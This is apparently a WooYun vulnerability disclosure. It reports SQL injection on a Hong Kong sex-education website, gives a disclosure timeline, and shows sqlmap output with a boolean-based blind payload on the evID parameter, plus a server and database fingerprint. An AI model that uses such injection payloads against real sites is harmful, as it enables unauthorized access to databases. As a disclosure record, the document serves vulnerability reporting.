wybug_title: 某性教育网站存在SQL注入（香港地區）

wybug_detail:
漏洞详情 披露状态：   									2015-12-10：	细节已通知厂商并且等待厂商处理中									2015-12-14：	厂商已经确认，细节仅向厂商公开									2015-12-24：	细节向核心白帽子及相关领域专家公开									2016-01-03：	细节向普通白帽子公开									2016-01-13：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述：  详细说明：  注入点：http://**.**.**.**/sexedu/b5/event/event_details.asp?evID=289
sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:---Parameter: evID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: evID=289 AND 7223=7223---web server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2012sqlmap resumed the following injection point(s) from stored session:---Parameter: evID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: evID=289 AND 7223=7223---web server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2012current database:	Nonecurrent user is DBA:    False
